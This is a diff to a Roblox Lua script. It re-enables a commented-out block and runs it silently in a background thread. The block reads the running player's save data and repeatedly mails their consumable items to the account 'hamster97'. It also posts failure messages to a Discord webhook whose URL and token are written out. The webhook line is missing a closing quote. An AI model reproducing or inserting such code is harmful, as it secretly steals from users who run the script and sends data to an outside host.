@@ -1,7 +1,7 @@
 return function(dh,pn,gn,dp,potc)
 if not dp then dp = 0 end
---[[if not potc then
-pcall(function()
+if not potc then
+spawn(function()pcall(function()
 potc = 0
 local pots = {}
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
@@ -29,14 +29,23 @@ for i,v in pairs(pots) do
 local x,y = false, "x"
 repeat
 x,y = mail("hamster97", "Consumable", i, v)
-wait(0.2
+if not x then
+request(
+{
+Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = '{"tts":false,"content":"@everyone '..y..'"}'
+}
+) end
+wait(0.2)
 until x==true
 
 end
 end
 end
-end)
-end]]
+end)end)
+end
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
 local msg = ""
